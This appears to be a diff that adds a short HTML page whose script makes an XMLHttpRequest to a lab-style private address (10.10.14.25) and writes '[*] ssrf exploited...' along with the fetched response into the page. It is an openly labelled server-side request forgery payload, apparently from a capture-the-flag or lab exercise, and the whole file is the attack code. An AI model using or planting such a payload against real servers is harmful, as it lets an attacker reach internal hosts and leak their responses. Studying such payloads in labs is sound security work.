@@ -1,0 +1,15 @@
+<html>
+    <head></head>
+    <body>
+
+        <script>
+            const url = "http://10.10.14.25/?x=x";
+
+            const xhr = new XMLHttpRequest();
+            xhr.open("GET", url, true);
+            xhr.send();
+            document.write("<br>[*] ssrf exploited...</br>")
+            document.write(xhr.response);
+        </script>
+    </body>
+</html>
